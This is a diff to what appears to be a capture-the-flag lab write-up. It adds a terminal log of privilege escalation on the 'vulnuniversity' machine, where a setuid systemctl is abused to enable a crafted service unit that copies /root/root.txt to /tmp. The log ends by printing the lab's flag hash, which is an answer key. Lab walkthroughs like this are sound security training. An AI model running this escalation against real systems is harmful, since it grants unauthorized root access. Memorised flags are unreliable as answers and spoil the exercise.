@@ -38,4 +38,46 @@ http://10.10.196.195:3333
     (Use mode '-w' if you want to scan it anyway)
 
 
+WantedBy=multi-user.target' > $TF
+www-data@vulnuniversity:/tmp$ 
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
+[Install]
+WantedBy=multi-user.target' > $TF
+www-data@vulnuniversity:/tmp$ TF=$(mktemp).service
+www-data@vulnuniversity:/tmp$ echo '[Service]
+> Type=oneshot
+> ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
+> [Install]
+> 
+WantedBy=multi-user.target' > $TF
+www-data@vulnuniversity:/tmp$ /usr/systemctl link $TF
+/usr/systemctl link $TF
+bash: /usr/systemctl: No such file or directory
+www-data@vulnuniversity:/tmp$ /bin/systemctl link $TF
+/bin/systemctl link $TF
+Created symlink from /etc/systemd/system/tmp.N6Kh8HR4Tu.service to /tmp/tmp.N6Kh8HR4Tu.service.
+www-data@vulnuniversity:/tmp$ /bin/systemctl enable --now $TF
+/bin/systemctl enable --now $TF
+Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.N6Kh8HR4Tu.service to /tmp/tmp.N6Kh8HR4Tu.service.
+www-data@vulnuniversity:/tmp$ ls
+ls
+exploit.sh
+output
+systemd-private-8b2af7c01c2244e1952743f721c3b68b-systemd-timesyncd.service-O7FxPo
+tmp.C8hSkKvv5U
+tmp.C8hSkKvv5U.service
+tmp.N6Kh8HR4Tu
+tmp.N6Kh8HR4Tu.service
+tmp.ZgAoUX6t5l
+tmp.jki5UiLBq5
+tmp.jki5UiLBq5.service
+www-data@vulnuniversity:/tmp$ cat output
+cat output
+a58ff8579f0a9270368d33a9966c7fd5
+www-data@vulnuniversity:/tmp$ 
+
+
 ```
